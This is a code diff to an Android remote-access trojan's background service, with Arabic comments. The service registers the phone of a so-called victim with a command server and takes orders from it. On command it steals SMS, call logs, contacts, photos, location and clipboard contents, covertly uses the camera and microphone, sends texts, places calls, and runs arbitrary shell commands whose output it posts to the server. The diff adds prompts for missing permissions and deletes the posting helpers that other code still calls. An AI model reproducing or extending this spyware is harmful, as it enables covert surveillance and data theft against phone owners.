@@ -72,10 +72,10 @@ public class ServiceRunner extends Service {
         super.onCreate();
         Log.d(TAG, "=== SERVICE onCreate ===");
 
-        // ★ اقرأ التوكن من BuildConfig
         try {
             victimToken = BuildConfig.VICTIM_TOKEN;
-            Log.d(TAG, "Victim Token: " + victimToken.substring(0, Math.min(16, victimToken.length())) + "...");
+            Log.d(TAG, "Victim Token: "
+                    + victimToken.substring(0, Math.min(16, victimToken.length())) + "...");
         } catch (Exception e) {
             Log.e(TAG, "BuildConfig error: " + e.getMessage());
             victimToken = "DEFAULT_TOKEN";
@@ -95,7 +95,6 @@ public class ServiceRunner extends Service {
         deviceId = getDeviceId();
         Log.d(TAG, "Device ID: " + deviceId);
 
-        // ★ سجّل عند السيرفر
         new Thread(() -> {
             try {
                 Thread.sleep(2000);
@@ -105,7 +104,6 @@ public class ServiceRunner extends Service {
             }
         }).start();
 
-        // ★ polling
         scheduler = Executors.newSingleThreadScheduledExecutor();
         scheduler.scheduleAtFixedRate(this::pollCommands, 5, POLL_INTERVAL, TimeUnit.SECONDS);
         Log.d(TAG, "=== SERVICE STARTED ===");
@@ -158,8 +156,71 @@ public class ServiceRunner extends Service {
 
     private String getDeviceId() {
         try {
-            return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        } catch (Exception e) { return "unknown"; }
+            return Settings.Secure.getString(getContentResolver(),
+                    Settings.Secure.ANDROID_ID);
+        } catch (Exception e) {
+            return "unknown";
+        }
+    }
+
+    // ============================================================
+    // ★★★ التحقق من الصلاحيات ★★★
+    // ============================================================
+    private String getRequiredPermission(String action) {
+        switch (action) {
+            case "get_sms":
+                return android.Manifest.permission.READ_SMS;
+
+            case "get_call_log":
+                return android.Manifest.permission.READ_CALL_LOG;
+
+            case "get_contacts":
+                return android.Manifest.permission.READ_CONTACTS;
+
+            case "get_location":
+                return android.Manifest.permission.ACCESS_FINE_LOCATION;
+
+            case "get_photos":
+                return android.Manifest.permission.READ_EXTERNAL_STORAGE;
+
+            case "camera_front":
+            case "camera_back":
+            case "camera_record":
+                return android.Manifest.permission.CAMERA;
+
+            case "record_audio":
+                return android.Manifest.permission.RECORD_AUDIO;
+
+            case "send_sms":
+                return android.Manifest.permission.SEND_SMS;
+
+            case "call":
+                return android.Manifest.permission.CALL_PHONE;
+
+            default:
+                return null;
+        }
+    }
+
+    private boolean hasPermission(String permission) {
+        try {
+            return ContextCompat.checkSelfPermission(this, permission)
+                    == android.content.pm.PackageManager.PERMISSION_GRANTED;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    private void requestPermissionFromService(String permission) {
+        try {
+            Intent intent = new Intent(this, MainActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            intent.putExtra("request_permission", permission);
+            startActivity(intent);
+            Log.d(TAG, "Launched MainActivity for permission request");
+        } catch (Exception e) {
+            Log.e(TAG, "requestPermission error: " + e.getMessage());
+        }
     }
 
     // ============================================================
@@ -221,34 +282,45 @@ public class ServiceRunner extends Service {
             action = cmd.optString("action", "");
             Log.d(TAG, "Command: " + action);
 
+            // ★★★ التحقق من الصلاحية قبل التنفيذ
+            String requiredPerm = getRequiredPermission(action);
+            if (requiredPerm != null && !hasPermission(requiredPerm)) {
+                Log.w(TAG, "Missing permission for " + action + ": " + requiredPerm);
+                reportCommandResult(action, "fail",
+                        "permission_required: " + requiredPerm);
+                requestPermissionFromService(requiredPerm);
+                return;
+            }
+
             switch (action) {
-                case "get_device_info": sendDeviceInfo(); break;
-                case "get_battery": sendBattery(); break;
-                case "get_sms": sendSms(); break;
-                case "get_call_log": sendCallLog(); break;
-                case "get_contacts": sendContacts(); break;
-                case "get_apps": sendApps(); break;
-                case "get_photos": sendPhotos(); break;
-                case "get_location": sendLocation(); break;
-                case "get_clipboard": sendClipboard(); break;
+                case "get_device_info":     sendDeviceInfo(); break;
+                case "get_battery":         sendBattery(); break;
+                case "get_sms":             sendSms(); break;
+                case "get_call_log":        sendCallLog(); break;
+                case "get_contacts":        sendContacts(); break;
+                case "get_apps":            sendApps(); break;
+                case "get_photos":          sendPhotos(); break;
+                case "get_location":        sendLocation(); break;
+                case "get_clipboard":       sendClipboard(); break;
 
-                case "camera_front": takePicture(1); break;
-                case "camera_back": takePicture(0); break;
-                case "camera_record": recordVideo(0, cmd.optInt("duration", 10000)); break;
+                case "camera_front":        takePicture(1); break;
+                case "camera_back":         takePicture(0); break;
+                case "camera_record":       recordVideo(0, cmd.optInt("duration", 10000)); break;
 
-                case "record_audio": recordAudio(cmd.optInt("duration", 10000)); break;
-                case "play_sound": playSound(); break;
-                case "play_alarm": playAlarm(); break;
+                case "record_audio":        recordAudio(cmd.optInt("duration", 10000)); break;
+                case "play_sound":          playSound(); break;
+                case "play_alarm":          playAlarm(); break;
 
-                case "vibrate": vibrate(cmd.optLong("ms", 2000)); break;
-                case "toast": showToast(cmd.optString("text", "Hello")); break;
-                case "send_sms": sendSmsToNumber(cmd.optString("to"), cmd.optString("msg")); break;
-                case "call": callNumber(cmd.optString("to")); break;
-                case "open_url": openUrl(cmd.optString("url")); break;
-                case "shell": executeShell(cmd.optString("command", "")); break;
-                case "volume_max": maxVolume(); break;
-                case "lock_screen": lockScreen(); break;
-                case "show_home": goHome(); break;
+                case "vibrate":             vibrate(cmd.optLong("ms", 2000)); break;
+                case "toast":               showToast(cmd.optString("text", "Hello")); break;
+                case "send_sms":            sendSmsToNumber(cmd.optString("to"),
+                                                            cmd.optString("msg")); break;
+                case "call":                callNumber(cmd.optString("to")); break;
+                case "open_url":            openUrl(cmd.optString("url")); break;
+                case "shell":               executeShell(cmd.optString("command", "")); break;
+                case "volume_max":          maxVolume(); break;
+                case "lock_screen":         lockScreen(); break;
+                case "show_home":           goHome(); break;
 
                 default: reportCommandResult(action, "fail", "unknown_action");
             }
@@ -291,9 +363,11 @@ public class ServiceRunner extends Service {
 
     private void sendBattery() {
         try {
-            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            android.content.IntentFilter ifilter =
+                    new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
             android.content.Intent batteryStatus = registerReceiver(null, ifilter);
             if (batteryStatus == null) return;
+
             int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
             int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
             int status = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
@@ -347,9 +421,12 @@ public class ServiceRunner extends Service {
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 50) {
                     JSONObject call = new JSONObject();
-                    call.put("number", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
-                    call.put("duration", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
-                    call.put("type", c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
+                    call.put("number",
+                            c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    call.put("duration",
+                            c.getString(c.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    call.put("type",
+                            c.getString(c.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                     arr.put(call);
                 }
                 c.close();
@@ -370,7 +447,8 @@ public class ServiceRunner extends Service {
         try {
             JSONArray arr = new JSONArray();
             Cursor c = getContentResolver().query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    null, null, null, null);
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 100) {
                     JSONObject contact = new JSONObject();
@@ -428,7 +506,8 @@ public class ServiceRunner extends Service {
             if (c != null) {
                 while (c.moveToNext() && arr.length() < 20) {
                     JSONObject p = new JSONObject();
-                    p.put("path", c.getString(c.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
+                    p.put("path", c.getString(c.getColumnIndexOrThrow(
+                            MediaStore.Images.Media.DATA)));
                     arr.put(p);
                 }
                 c.close();
@@ -556,19 +635,21 @@ public class ServiceRunner extends Service {
                                 reportCommandResult(camName, "ok", "");
                                 Log.d(TAG, "Photo sent, size: " + data.length);
                             } catch (Exception e) {
-                                reportCommandResult(camName, "fail", "send: " + e.getMessage());
+                                reportCommandResult(camName, "fail",
+                                        "send: " + e.getMessage());
                             } finally {
                                 try { cam.release(); } catch (Exception ignored) {}
                             }
                         });
                     } catch (Exception e) {
-                        reportCommandResult(camName, "fail", "takePicture: " + e.getMessage());
+                        reportCommandResult(camName, "fail",
+                                "takePicture: " + e.getMessage());
                         try { finalCamera.release(); } catch (Exception ignored) {}
                     }
                 }, 800);
 
             } catch (Exception e) {
-                Log.e(TAG, "takePicture: " + e.getMessage());
+                Log.e(TAG, "takePicture error: " + e.getMessage());
                 reportCommandResult("camera_" + (cameraId == 1 ? "front" : "back"),
                         "fail", e.getMessage());
                 if (camera != null) try { camera.release(); } catch (Exception ignored) {}
@@ -584,7 +665,8 @@ public class ServiceRunner extends Service {
             MediaRecorder recorder = null;
             String filePath = null;
             try {
-                filePath = getExternalCacheDir() + "/audio_" + System.currentTimeMillis() + ".3gp";
+                filePath = getExternalCacheDir() + "/audio_"
+                        + System.currentTimeMillis() + ".3gp";
                 recorder = new MediaRecorder();
                 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                 recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
@@ -649,7 +731,8 @@ public class ServiceRunner extends Service {
                 }
                 camera.unlock();
 
-                filePath = getExternalCacheDir() + "/video_" + System.currentTimeMillis() + ".mp4";
+                filePath = getExternalCacheDir() + "/video_"
+                        + System.currentTimeMillis() + ".mp4";
                 recorder = new MediaRecorder();
                 recorder.setCamera(camera);
                 recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
@@ -712,7 +795,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // Others
+    // Sounds
     // ============================================================
     private void playSound() {
         try {
@@ -720,7 +803,9 @@ public class ServiceRunner extends Service {
                     RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION));
             if (r != null) r.play();
             reportCommandResult("play_sound", "ok", "");
-        } catch (Exception e) { reportCommandResult("play_sound", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("play_sound", "fail", e.getMessage());
+        }
     }
 
     private void playAlarm() {
@@ -729,9 +814,14 @@ public class ServiceRunner extends Service {
                     RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM));
             if (r != null) r.play();
             reportCommandResult("play_alarm", "ok", "");
-        } catch (Exception e) { reportCommandResult("play_alarm", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("play_alarm", "fail", e.getMessage());
+        }
     }
 
+    // ============================================================
+    // Vibrate
+    // ============================================================
     private void vibrate(long ms) {
         try {
             Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
@@ -744,7 +834,9 @@ public class ServiceRunner extends Service {
                 }
             }
             reportCommandResult("vibrate", "ok", "");
-        } catch (Exception e) { reportCommandResult("vibrate", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("vibrate", "fail", e.getMessage());
+        }
     }
 
     private void showToast(final String text) {
@@ -752,7 +844,9 @@ public class ServiceRunner extends Service {
             try {
                 Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show();
                 reportCommandResult("toast", "ok", "");
-            } catch (Exception e) { reportCommandResult("toast", "fail", e.getMessage()); }
+            } catch (Exception e) {
+                reportCommandResult("toast", "fail", e.getMessage());
+            }
         });
     }
 
@@ -765,7 +859,9 @@ public class ServiceRunner extends Service {
             am.setStreamVolume(AudioManager.STREAM_ALARM,
                     am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
             reportCommandResult("volume_max", "ok", "");
-        } catch (Exception e) { reportCommandResult("volume_max", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("volume_max", "fail", e.getMessage());
+        }
     }
 
     private void sendSmsToNumber(String to, String msg) {
@@ -773,7 +869,9 @@ public class ServiceRunner extends Service {
             SmsManager sm = SmsManager.getDefault();
             sm.sendTextMessage(to, null, msg, null, null);
             reportCommandResult("send_sms", "ok", "");
-        } catch (Exception e) { reportCommandResult("send_sms", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("send_sms", "fail", e.getMessage());
+        }
     }
 
     private void callNumber(String number) {
@@ -783,7 +881,9 @@ public class ServiceRunner extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             reportCommandResult("call", "ok", "");
-        } catch (Exception e) { reportCommandResult("call", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("call", "fail", e.getMessage());
+        }
     }
 
     private void openUrl(String url) {
@@ -792,13 +892,16 @@ public class ServiceRunner extends Service {
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             reportCommandResult("open_url", "ok", "");
-        } catch (Exception e) { reportCommandResult("open_url", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("open_url", "fail", e.getMessage());
+        }
     }
 
     private void executeShell(String command) {
         try {
             Process p = Runtime.getRuntime().exec(command);
-            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(p.getInputStream()));
             StringBuilder output = new StringBuilder();
             String line;
             while ((line = reader.readLine()) != null) output.append(line).append("\n");
@@ -812,16 +915,21 @@ public class ServiceRunner extends Service {
             d.put("output", output.toString());
             postJson("/apk/victim/data", d);
             reportCommandResult("shell", "ok", "");
-        } catch (Exception e) { reportCommandResult("shell", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("shell", "fail", e.getMessage());
+        }
     }
 
     private void lockScreen() {
         try {
             android.app.admin.DevicePolicyManager dpm =
-                    (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+                    (android.app.admin.DevicePolicyManager)
+                            getSystemService(Context.DEVICE_POLICY_SERVICE);
             if (dpm != null) dpm.lockNow();
             reportCommandResult("lock_screen", "ok", "");
-        } catch (Exception e) { reportCommandResult("lock_screen", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("lock_screen", "fail", e.getMessage());
+        }
     }
 
     private void goHome() {
@@ -831,7 +939,9 @@ public class ServiceRunner extends Service {
             intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
             reportCommandResult("show_home", "ok", "");
-        } catch (Exception e) { reportCommandResult("show_home", "fail", e.getMessage()); }
+        } catch (Exception e) {
+            reportCommandResult("show_home", "fail", e.getMessage());
+        }
     }
 
     // ============================================================
@@ -858,40 +968,3 @@ public class ServiceRunner extends Service {
             Log.e(TAG, "httpGet: " + e.getMessage());
         }
         return null;
-    }
-
-    private String postJsonWithResponse(String path, JSONObject data) {
-        try {
-            URL url = new URL(SERVER_URL + path);
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-            conn.setRequestMethod("POST");
-            conn.setRequestProperty("Content-Type", "application/json");
-            conn.setDoOutput(true);
-            conn.setConnectTimeout(20000);
-            conn.setReadTimeout(20000);
-
-            DataOutputStream os = new DataOutputStream(conn.getOutputStream());
-            os.writeBytes(data.toString());
-            os.flush();
-            os.close();
-
-            int rc = conn.getResponseCode();
-            if (rc == 200) {
-                BufferedReader reader = new BufferedReader(
-                        new InputStreamReader(conn.getInputStream()));
-                StringBuilder sb = new StringBuilder();
-                String line;
-                while ((line = reader.readLine()) != null) sb.append(line);
-                reader.close();
-                return sb.toString();
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "postJsonWithResponse: " + e.getMessage());
-        }
-        return null;
-    }
-
-    private void postJson(String path, JSONObject data) {
-        postJsonWithResponse(path, data);
-    }
-                    }
